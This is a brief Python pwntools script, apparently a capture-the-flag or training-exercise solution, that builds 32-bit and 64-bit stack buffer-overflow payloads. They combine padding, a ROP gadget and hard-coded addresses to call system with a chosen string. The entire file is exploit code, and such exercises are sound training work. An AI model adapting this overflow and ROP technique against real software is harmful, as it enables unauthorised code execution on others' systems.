from pwn import *

def solve32():
    systemcallAddress = p32(0x08048657)
    usefulStringAddress = p32(0x804a030)
    payload = 'a'*44 + systemcallAddress + usefulStringAddress
    return payload

def solve64():
    systemcallAddress = p64(0x0000000000400810)
    usefulStringAddress = p64(0x0000000000601060)
    rop = p64(0x0000000000400883)
    payload = 'a'*40 + rop + usefulStringAddress + systemcallAddress
    return payload

print solve64()
